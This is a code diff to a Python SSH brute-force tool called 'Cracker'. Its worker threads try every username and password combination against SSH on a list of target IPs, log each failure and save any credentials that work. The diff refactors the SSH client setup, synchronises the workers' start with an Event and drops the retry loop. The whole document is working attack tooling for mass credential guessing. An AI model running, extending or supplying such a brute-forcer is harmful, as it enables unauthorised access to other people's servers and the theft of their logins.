@@ -1,4 +1,4 @@
-from threading import Thread, Lock
+from threading import Thread, Lock, Event
 from pystyle import Colors, Colorate, Center, Write
 from datetime import datetime
 from multiprocessing import RawValue
@@ -139,6 +139,7 @@ class Cracker:
         self.tried = Counter()
         self.tps = Counter()
         self.cracked = Counter()
+        self.event = Event()
     
     def isRunning(self):
         return int(self.tried) < len(self.sync_ips)
@@ -154,6 +155,7 @@ class Cracker:
         for _ in range(self.threads):
             Cracker.Worker(self).start()
 
+        self.event.set()
         while self.isRunning():
             self.tps.set(0)
             sleep(.9)
@@ -164,8 +166,14 @@ class Cracker:
         def __init__(self, root):
             super().__init__(daemon=True)
             self.root = root
+            self.sshClient = SSHClient()
+
 
         def run(self):
+            self.sshClient.set_missing_host_key_policy(AutoAddPolicy()) 
+            self.sshClient.load_system_host_keys()
+            self.root.event.wait()
+
             with suppress(StopIteration, RuntimeError):
                 while self.root.isRunning():
                     self.crack(next(self.root.sync_ips_iter))
@@ -176,25 +184,18 @@ class Cracker:
             
             for username in self.root.userlist:
                 for password in self.root.passlist:
-                    ties = 5
-                    while ties:
-                        try:
-                            sshClient = SSHClient()
-                            sshClient.set_missing_host_key_policy(AutoAddPolicy()) 
-                            sshClient.load_system_host_keys()
-                            sshClient.connect(target, port, username, password, timeout=1, banner_timeout=1.1)
-                            self.root.save(target, port, username, password)
-                            ties = 0
+                    try:
+                        self.sshClient.connect(target, port, username, password, timeout=1, banner_timeout=200)
+                        self.sshClient.close()
+                        self.root.save(target, port, username, password)
+                        return
 
-                        except TimeoutError:
-                            Logger.fail("[%s] Timeout !" % target)
-                            ties = 0
-                        except AuthenticationException:
-                            Logger.fail("[%s] Invalid user or password %s:%s" % (target, username, password))
-                            ties = 0
-                        except Exception as e:
-                            Logger.warning("[%s]" % target, e)
-                            ties -= 1
+                    except TimeoutError:
+                        Logger.fail("[%s] Timeout !" % target)
+                    except AuthenticationException:
+                        Logger.fail("[%s] Invalid user or password %s:%s" % (target, username, password))
+                    except Exception as e:
+                        Logger.warning("[%s]" % target, e)
                             
                         
             self.root.tried += 1
